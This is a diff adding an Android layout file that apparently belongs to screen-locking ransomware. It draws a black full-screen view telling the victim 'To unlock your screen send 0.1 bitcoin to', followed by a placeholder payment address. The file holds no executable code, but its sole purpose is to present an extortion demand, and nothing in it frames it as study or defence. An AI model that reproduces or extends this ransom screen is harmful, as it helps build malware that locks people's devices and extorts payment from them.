@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#000000"
+    >
+    <TextView
+        android:id="@+id/desc"
+        android:gravity="center"
+        android:layout_centerInParent="true"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:textColor="@color/white"
+        android:text="To unlock your screen send 0.1 bitcoin to"
+        />
+    <TextView
+        android:id="@+id/addr"
+        android:layout_below="@id/desc"
+        android:layout_centerInParent="true"
+        android:gravity="center"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:background="#f1f1f1"
+        android:textStyle="bold"
+        android:textColor="#4277c9"
+        android:text="Some address"
+        />
+</RelativeLayout>
